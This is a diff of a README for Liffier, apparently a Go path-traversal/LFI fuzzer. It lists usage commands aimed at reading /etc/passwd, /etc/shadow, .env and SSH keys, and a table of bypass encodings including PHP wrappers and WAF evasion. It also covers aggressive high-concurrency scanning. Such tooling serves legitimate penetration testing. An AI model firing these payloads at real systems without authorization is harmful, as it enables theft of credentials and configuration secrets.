@@ -1,155 +1,149 @@
 # Liffier
 
-Path traversal / LFI fuzzer with 16 encoding bypass techniques, automatic response analysis, concurrent requests, and proxy support (Burp/Caido).
+Path traversal / LFI fuzzer written in Go. 66 encoding bypass techniques, automatic response analysis, concurrent goroutines, proxy support, wordlist input, and payload generation.
 
-## Why
-
-Testing for path traversal means trying dozens of encoding variants at multiple depths against multiple files. Doing it manually is slow. Liffier generates all combinations, fires them concurrently, and tells you which ones actually worked - with confidence levels based on response content analysis, not just status codes.
-
-## Features
-
-- **16 encoding techniques** - plain, URL-encoded, double-encoded, overlong UTF-8, backslash, mixed, null-byte, and more
-- **Automatic hit detection** - analyzes response content for file signatures (passwd entries, ini sections, env vars), compares against baseline, flags anomalies
-- **Concurrent requests** - configurable thread pool
-- **Proxy support** - route through Burp Suite or Caido
-- **Bypass suffixes** - null bytes, extension tricks for PHP/Java include bypasses
-- **Multiple output modes** - rich tables, quiet mode, JSON/JSONL/CSV export
-- **Payload generation** - dump payloads to stdout for ffuf, Burp Intruder, etc.
-- **Wordlists included** - Linux, Windows, and webapp config file targets
+Single static binary. No runtime dependencies.
 
 ## Install
 
 ```bash
-pip install git+https://github.com/momenbasel/liffier.git
+go install github.com/momenbasel/liffier/cmd/liffier@latest
 ```
 
-Or clone:
+Or build from source:
 
 ```bash
 git clone https://github.com/momenbasel/liffier.git
 cd liffier
-pip install -e .
+go build -o liffier ./cmd/liffier/
 ```
 
 ## Usage
 
-### Basic fuzzing
+### Fuzz a URL for path traversal
 
 ```bash
-# Fuzz a parameter for /etc/passwd with all encodings
+# Default: test /etc/passwd with all 66 encodings, depth 1-10
 liffier fuzz "https://target.com/page?file="
 
-# Target a specific file
-liffier fuzz "https://target.com/page?file=" --file /etc/shadow
+# Custom file, 15 depth levels, 100 concurrent workers
+liffier fuzz "https://target.com/page?file=" -f /etc/shadow -d 15 -w 100
 
-# Limit depth and use specific encodings
-liffier fuzz "https://target.com/page?file=" --depth 15 -e plain -e url-encoded -e double-url
+# With proxy (Burp/Caido)
+liffier fuzz "https://target.com/page?file=" -x http://127.0.0.1:8080
+
+# Authenticated
+liffier fuzz "https://target.com/page?file=" -c "session=abc123" -H "Authorization: Bearer token"
+
+# Enable null-byte and extension bypass suffixes
+liffier fuzz "https://target.com/page?file=" --bypass
+
+# Specific encodings only
+liffier fuzz "https://target.com/page?file=" -e plain -e url-encoded -e double-url -e overlong-slash-2byte
 ```
 
-### With proxy (Burp/Caido)
+### Fuzz with a wordlist of target files
 
 ```bash
-liffier fuzz "https://target.com/page?file=" --proxy http://127.0.0.1:8080
-```
+# Test every file in the wordlist against the URL
+liffier fuzz "https://target.com/page?file=" -l wordlists/linux.txt
 
-### Authenticated testing
+# Combine with high concurrency
+liffier fuzz "https://target.com/page?file=" -l wordlists/webapp.txt -w 200 --bypass
 
-```bash
-liffier fuzz "https://target.com/page?file=" \
-    -c "session=abc123; token=xyz" \
-    -H "Authorization: Bearer eyJ..."
-```
-
-### Enable bypass suffixes (null bytes, extension tricks)
-
-```bash
-liffier fuzz "https://target.com/include.php?path=" --bypass
+# Windows targets
+liffier fuzz "https://target.com/page?file=" -l wordlists/windows.txt
 ```
 
 ### Quick scan (multiple common files)
 
 ```bash
-# Tests passwd, shadow, hosts, environ, win.ini, .env, etc.
+# Tests passwd, shadow, hosts, environ, win.ini, .env, .git, wp-config, etc.
 liffier scan "https://target.com/page?file="
-
-# Custom file list
-liffier scan "https://target.com/page?file=" -f /etc/passwd -f .env -f wp-config.php
 ```
 
-### Generate payloads for other tools
+### Generate payloads (pipe to other tools)
 
 ```bash
 # Pipe to ffuf
-liffier payloads -f /etc/passwd | ffuf -u "https://target.com/page?file=FUZZ" -w -
+liffier payloads -f /etc/passwd | ffuf -u "https://target/file=FUZZ" -w -
 
-# Pipe to Burp Intruder (via file)
+# With bypass suffixes
 liffier payloads -f /etc/passwd --bypass > payloads.txt
 
-# With specific encodings only
-liffier payloads -e url-encoded -e double-url -f /etc/shadow
+# From wordlist
+liffier payloads -l wordlists/linux.txt -d 5 -e url-encoded
 ```
 
-### List available encodings
+### List encodings
 
 ```bash
 liffier encodings
 ```
 
-### Tuning
+### Export results
 
 ```bash
-# 20 threads, 15s timeout, 0.1s delay between requests
-liffier fuzz "https://target.com/page?file=" -w 20 -t 15 --delay 0.1
-
-# Only show hits
-liffier fuzz "https://target.com/page?file=" --hits-only
-
-# Quiet mode (one line per hit, no tables)
-liffier fuzz "https://target.com/page?file=" --quiet
-
-# Export results
 liffier fuzz "https://target.com/page?file=" -o results.json
 liffier fuzz "https://target.com/page?file=" -o results.csv --format csv
+liffier fuzz "https://target.com/page?file=" -o results.jsonl --format jsonl
+
+# Only export hits
+liffier fuzz "https://target.com/page?file=" -o hits.json --hits-only
 ```
 
-## Encoding Techniques
+## Encoding Techniques (66)
 
-| Name | Sequence | Notes |
+Categories:
+
+| Category | Count | Examples |
 |---|---|---|
-| plain | `../` | Standard traversal |
-| url-encoded | `..%2f` | Bypasses basic string filters |
-| url-encoded-full | `%2e%2e%2f` | Full URL encoding |
-| double-url | `..%252f` | Bypasses single-decode filters |
-| double-url-full | `%252e%252e%252f` | Full double encoding |
-| backslash | `..\` | Windows paths |
-| url-backslash | `..%5c` | URL-encoded backslash |
-| dot-overlong-utf8 | `..%c0%af` | Overlong UTF-8 slash |
-| dot-overlong-utf8-2 | `%c0%ae%c0%ae%c0%af` | Full overlong dots + slash |
-| dot-overlong-utf8-3 | `..%ef%bc%8f` | Fullwidth solidus |
-| mixed-slash | `..\/` | Mixed separator |
-| double-dot-variation | `....//` | Filter evasion |
-| triple-dot | `.../.../` | Alternate pattern |
-| null-byte-suffix | `../%00` | Null byte injection |
-| url-encoded-backslash-full | `%2e%2e%5c` | Full encoded backslash |
-| utf8-dot | (two-dot leader)/  | Unicode dot variant |
+| Basic | 3 | `../`, `..\`, `..//` |
+| URL encoded (single) | 5 | `..%2f`, `%2e%2e%2f`, `..%5c` |
+| URL encoded (double) | 4 | `..%252f`, `%252e%252e%252f` |
+| URL encoded (triple) | 2 | `..%25252f` |
+| Overlong UTF-8 | 7 | `..%c0%af`, `..%e0%80%af`, `..%c1%9c` |
+| Unicode/fullwidth | 5 | `..%ef%bc%8f`, `%ef%bc%8e%ef%bc%8e%ef%bc%8f` |
+| Null byte | 3 | `../%00`, `..%00/`, `.%00./` |
+| Filter evasion | 6 | `....//`, `.../.../`, `./../` |
+| IIS specific | 5 | `..%u002f`, `..%u2215`, `..%%35c` |
+| Java/Tomcat | 5 | `..;/`, `..;foo=bar/`, `/./../` |
+| PHP wrappers | 6 | `php://filter/...`, `data://...`, `expect://` |
+| WAF bypass | 5 | tab/CR/LF/space injection, `..+/` |
+| Case variation | 3 | `..%2F`, `%2E%2E/` |
+| Mixed/other | 7 | `..\\/`, `../\`, long UTF-8 padding |
+
+Run `liffier encodings` for the full list.
 
 ## Detection
 
-Liffier doesn't just check status codes. It:
+Not just status code checking. Liffier:
 
-1. Fetches a baseline response (known-bad request) for length comparison
-2. Checks response body for file-specific signatures (e.g. `root:x:0:0:` for passwd)
-3. Detects error pages via pattern matching
-4. Compares response length against baseline for anomaly detection
-5. Assigns confidence levels: **HIGH** (signature match), **MEDIUM** (structural match), **LOW** (length anomaly)
+1. Sends a baseline request (known-bad path) and records response length
+2. Matches response bodies against file-specific signatures (`root:x:0:0:` for passwd, `[fonts]` for win.ini, etc.)
+3. Pattern-matches for error pages (404, 403, 500 text)
+4. Compares response length against baseline - flags anomalies (>30% difference)
+5. Assigns confidence: **HIGH** (signature), **MEDIUM** (structural), **LOW** (length anomaly)
+
+## Performance
+
+Go goroutines with no upper limit on `-w`. Default is 10 workers. For aggressive scanning:
+
+```bash
+# 500 concurrent goroutines
+liffier fuzz "https://target.com/page?file=" -w 500
+
+# With rate limiting (100ms between launches)
+liffier fuzz "https://target.com/page?file=" -w 500 --delay 100
+```
 
 ## Wordlists
 
 Included in `wordlists/`:
 
 - `linux.txt` - /etc/passwd, /proc/*, logs, SSH keys, configs
-- `windows.txt` - win.ini, SAM, SYSTEM, IIS configs, xampp
-- `webapp.txt` - .env, wp-config.php, web.xml, .git/config, composer.json
+- `windows.txt` - win.ini, SAM, SYSTEM, IIS configs
+- `webapp.txt` - .env, wp-config.php, .git/config, web.xml
 
 ## License
 
